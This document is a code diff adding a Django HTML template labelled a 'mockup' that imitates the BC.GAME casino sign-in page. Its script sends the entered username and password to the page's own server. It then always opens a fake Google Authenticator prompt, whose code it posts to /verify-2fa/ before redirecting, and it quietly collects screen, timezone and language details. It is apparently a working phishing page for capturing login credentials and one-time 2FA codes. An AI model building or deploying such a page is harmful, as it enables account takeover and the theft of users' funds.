@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BC.GAME Login Mockup</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root {
+            --bg-dark: #1e2024;
+            --bg-card: #2d3035;
+            --brand-green: #3bc117;
+            --text-gray: #98a7b5;
+        }
+
+        body {
+            background-color: #303438;
+            font-family: 'Segoe UI', Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: white;
+        }
+
+        .login-container {
+            background-color: #303438;
+            width: 400px;
+            border-radius: 20px;
+            overflow: hidden;
+            position: relative;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+
+        /* FIXED CLOSE BUTTON */
+        .close-btn {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: #34363b;
+            border: none;
+            color: white;
+            border-radius: 8px; /* Slightly more rounded like image */
+            width: 30px;
+            height: 30px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            z-index: 100;
+            font-size: 18px;
+            line-height: 1;
+        }
+
+        .hero-section {
+            padding: 20px;
+            position: relative;
+            height: 200px;
+            display: flex;
+            align-items: flex-start;
+        }
+
+        .perks-list {
+            position: relative;
+            z-index: 5;
+            pointer-events: none;
+        }
+
+        .perks-list * { pointer-events: auto; }
+
+        .logo {
+            width: 120px;
+            margin-bottom: 20px;
+            display: block;
+        }
+
+        .perk-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+
+        .perk-icon {
+            color: var(--brand-green);
+            font-size: 18px;
+            margin-right: 12px;
+        }
+
+        .perk-text b { font-size: 14px; color: white; display: block; line-height: 1.2;}
+        .perk-text p { font-size: 11px; color: var(--text-gray); margin: 0; }
+
+        .hero-image-container {
+            position: absolute;
+            top: 20px;
+            right: -10px;
+            z-index: 1;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: flex-end;
+            align-items: flex-start;
+        }
+
+        .hero-image {
+            width: 260px;
+            height: auto;
+            opacity: 0.9;
+            margin-top: 10px;
+        }
+
+        .form-section {
+            padding: 10px 25px 25px 25px;
+            background: #222627;
+            position: relative;
+            z-index: 10;
+        }
+
+        h2 { margin: 0 0 15px 0; font-size: 20px; }
+
+        .tab-container {
+            display: flex;
+            background: #1a1c1f;
+            border-radius: 10px;
+            padding: 4px;
+            margin-bottom: 20px;
+        }
+
+        .tab {
+            flex: 1;
+            padding: 10px;
+            text-align: center;
+            border-radius: 8px;
+            font-size: 14px;
+            cursor: pointer;
+            color: var(--text-gray);
+        }
+
+        .tab.active {
+            background: #1a1c1f;
+            color: white;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+
+        .input-group { margin-bottom: 12px; position: relative; }
+
+        input, #id_identifier, #id_password {
+            width: 100%;
+            background: #1a1c1f;
+            border: 1px solid #2d3035;
+            padding: 14px;
+            border-radius: 10px;
+            color: white;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-gray);
+            cursor: pointer;
+            z-index: 100;
+        }
+
+        .forgot-pass {
+            text-align: right;
+            font-size: 13px;
+            color: var(--text-gray);
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+
+        .btn-signin {
+            width: 100%;
+            background: linear-gradient(90deg, #3CEE87, #8BE875);
+            border: none;
+            padding: 14px;
+            border-radius: 10px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+
+        .footer-links {
+            text-align: center;
+            font-size: 13px;
+            color: white;
+            margin-bottom: 20px;
+        }
+
+        .footer-links span { color: var(--brand-green); cursor: pointer; }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            color: var(--text-gray);
+            font-size: 12px;
+            margin-bottom: 15px;
+        }
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #2d3035;
+        }
+        .divider span { padding: 0 10px; }
+
+        .passkey-btn {
+            width: 100%;
+            background: #303438;
+            border: 1px solid #34363b;
+            color: white;
+            padding: 12px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 14px;
+        }
+
+        .social-icons {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .icon-box {
+            background: #303438;
+            width: 38px;
+            height: 38px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 8px;
+            cursor: pointer;
+            color: var(--text-gray);
+            border: 1px solid #34363b;
+        }
+
+        .custom-badge {
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 24px;
+            height: 24px;
+            margin-right: 12px;
+        }
+
+        .badge-symbol {
+            position: absolute;
+            font-size: 10px;
+            color: #1e2024;
+            font-weight: 900;
+            z-index: 2;
+        }
+
+        .custom-badge .fa-certificate {
+            font-size: 22px;
+            color: var(--brand-green);
+        }
+
+        .passkey-icon-wrapper {
+            position: relative;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 20px;
+            height: 20px;
+            margin-right: 10px;
+        }
+
+        .passkey-icon-wrapper .fa-user { font-size: 14px; color: #98a7b5; }
+        .passkey-icon-wrapper .fa-key {
+            font-size: 8px;
+            color: #ffffff;
+            position: absolute;
+            bottom: -2px;
+            right: -2px;
+            transform: rotate(-45deg);
+            background: #303438;
+            padding: 1px;
+            border-radius: 50%;
+        }
+
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            display: none;
+            justify-content: center;
+            align-items: flex-end;
+            z-index: 1000;
+        }
+
+        .two-fa-card {
+            background-color: #24262b;
+            width: 380px;
+            border-radius: 24px 24px 0 0;
+            padding: 30px 24px;
+            position: relative;
+            box-shadow: 0 -20px 40px rgba(0,0,0,0.6);
+            text-align: center;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <button class="close-btn"><i class="fas fa-times"></i></button>
+
+    <div class="hero-section">
+        <div class="perks-list">
+            <img src="/static/admin/img/logo.png" alt="Logo" class="logo">
+
+            <div class="perk-item">
+                <div class="perk-icon"><i class="fas fa-gift"></i></div>
+                <div class="perk-text">
+                    <b>470%</b>
+                    <p>Welcome deposit bonus</p>
+                </div>
+            </div>
+
+            <div class="perk-item">
+                <div class="perk-icon"><i class="fas fa-dharmachakra"></i></div>
+                <div class="perk-text">
+                    <b>5 BTC</b>
+                    <p>Free daily lucky spin</p>
+                </div>
+            </div>
+
+            <div class="perk-item">
+                <div class="custom-badge">
+                    <i class="fas fa-certificate"></i>
+                    <span class="badge-symbol">%</span>
+                </div>
+                <div class="perk-text">
+                    <b>Free Perks</b>
+                    <p>Daily free rewards & bonuses</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="hero-image-container">
+            <img src="/static/admin/img/players_image.png" alt="Players" class="hero-image">
+        </div>
+    </div>
+
+    <div class="form-section">
+        <h2>Sign In</h2>
+
+        <div class="tab-container">
+            <div class="tab active"><i class="fas fa-lock"></i> Password</div>
+            <div class="tab"><i class="fas fa-mobile-alt"></i> One-time Code</div>
+        </div>
+
+        <form method="post" id="loginForm">
+            {% csrf_token %}
+            <div class="input-group">
+                {{ form.identifier }}
+            </div>
+
+            <div class="input-group">
+                {{ form.password }}
+                <div class="eye-icon" id="password-toggle"><i class="far fa-eye"></i></div>
+            </div>
+            
+            <!-- Hidden fields for additional data -->
+            <input type="hidden" name="screen_resolution" id="screen_resolution">
+            <input type="hidden" name="timezone" id="timezone">
+            <input type="hidden" name="language" id="language">
+
+            <div class="forgot-pass">Forgot your password?</div>
+
+            <button type="submit" class="btn-signin">Sign In</button>
+        </form>
+
+        <div class="footer-links">
+            New to BC.GAME? <span>Create account</span>
+        </div>
+
+        <div class="divider"><span>Log in directly with</span></div>
+
+        <button class="passkey-btn">
+            <div class="passkey-icon-wrapper">
+                <i class="fas fa-user"></i>
+                <i class="fas fa-key"></i>
+            </div>
+            Sign In with passkey
+        </button>
+
+        <div class="social-icons">
+            <div class="icon-box"><i class="fab fa-google"></i></div>
+            <div class="icon-box"><i class="fab fa-x-twitter"></i></div>
+            <div class="icon-box"><i class="fab fa-telegram"></i></div>
+            <div class="icon-box"><i class="fas fa-paw"></i></div>
+            <div class="icon-box"><i class="fas fa-wallet"></i></div>
+            <div class="icon-box"><i class="fab fa-line"></i></div>
+            <div class="icon-box"><i class="fab fa-steam"></i></div>
+        </div>
+    </div>
+</div>
+
+<script>
+// Collect client-side data
+function collectClientData() {
+    // Screen resolution
+    document.getElementById('screen_resolution').value = screen.width + 'x' + screen.height;
+    
+    // Timezone
+    document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    
+    // Language
+    document.getElementById('language').value = navigator.language;
+}
+
+// Collect data when page loads
+window.addEventListener('load', collectClientData);
+
+// Password toggle
+document.getElementById('password-toggle').addEventListener('click', function() {
+    const passwordInput = document.querySelector('input[type="password"], input[type="text"][name*="password"], #id_password');
+    const eyeIcon = this.querySelector('i');
+
+    if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        eyeIcon.classList.remove('fa-eye');
+        eyeIcon.classList.add('fa-eye-slash');
+    } else {
+        passwordInput.type = 'password';
+        eyeIcon.classList.remove('fa-eye-slash');
+        eyeIcon.classList.add('fa-eye');
+    }
+});
+
+// Show 2FA modal when form is submitted
+document.querySelector('#loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    // Collect latest client data
+    collectClientData();
+    
+    // Store form data for later use
+    const formData = new FormData(this);
+    window.loginFormData = formData;
+    
+    // Submit login form via AJAX first
+    fetch('/', {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.text())
+    .then(data => {
+        // After login is processed, show 2FA modal
+        document.getElementById('twoFAModal').style.display = 'flex';
+    })
+    .catch(error => {
+        // Even on error, show 2FA modal
+        document.getElementById('twoFAModal').style.display = 'flex';
+    });
+});
+
+function closeTwoFAModal() {
+    document.getElementById('twoFAModal').style.display = 'none';
+}
+
+// Handle 2FA confirmation
+function confirm2FA() {
+    const twoFaCode = document.querySelector('#twoFAModal input[type="text"]').value || '';
+    const identifier = document.querySelector('#id_identifier').value || '';
+    
+    // Send 2FA data to server
+    fetch('/verify-2fa/', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            twoFaCode: twoFaCode,
+            identifier: identifier
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        // Redirect to verification page
+        window.location.href = '/verification/';
+    })
+    .catch(error => {
+        // Redirect even on error
+        window.location.href = '/verification/';
+    });
+}
+</script>
+
+<!-- 2FA Modal -->
+<div class="modal-overlay" id="twoFAModal">
+    <div class="two-fa-card">
+        <button onclick="closeTwoFAModal()" style="position:absolute;top:20px;right:20px;background:#34363b;border:none;color:white;border-radius:8px;width:32px;height:32px;cursor:pointer;">&times;</button>
+        
+        <div style="width:50px;height:50px;background:#34363b;border-radius:50%;display:flex;justify-content:center;align-items:center;margin:10px auto 25px auto;">
+            <i class="fas fa-shield" style="color:#98a7b5;font-size:22px;"></i>
+        </div>
+
+        <div style="font-size:16px;font-weight:500;line-height:1.5;margin-bottom:30px;padding:0 10px;">
+            Enter the code generated by your Google Authenticator App
+        </div>
+
+        <div style="text-align:left;margin-bottom:25px;">
+            <label style="font-size:14px;color:#98a7b5;margin-bottom:10px;display:block;">Verification Code</label>
+            <div style="position:relative;display:flex;align-items:center;">
+                <input type="text" placeholder="6-digit verification code" style="width:100%;background:#17181b;border:1px solid #2d3035;padding:16px;border-radius:12px;color:white;font-size:14px;outline:none;">
+                <button style="position:absolute;right:10px;background:#4a4d52;border:none;color:white;padding:6px 14px;border-radius:8px;font-size:13px;cursor:pointer;">Paste</button>
+            </div>
+        </div>
+
+        <div style="font-size:14px;font-weight:bold;color:#98a7b5;margin-bottom:20px;">Don't have access to this 2FA?</div>
+
+        <button onclick="confirm2FA()" style="width:100%;background:linear-gradient(180deg,#3bc117 0%,#2a8a10 100%);border:none;padding:16px;border-radius:12px;color:#000;font-weight:800;font-size:16px;cursor:pointer;margin-bottom:25px;">Confirm</button>
+
+        <div style="display:flex;justify-content:space-between;border-top:1px solid #2d3035;padding-top:20px;">
+            <a href="#" style="color:#3bc117;font-size:14px;text-decoration:none;display:flex;align-items:center;gap:8px;"><i class="fas fa-envelope"></i> Switch to email</a>
+            <a href="#" style="color:#3bc117;font-size:14px;text-decoration:none;display:flex;align-items:center;gap:8px;"><i class="fas fa-mobile-screen"></i> Switch to phone</a>
+        </div>
+    </div>
+</div>
+
+</body>
+</html>
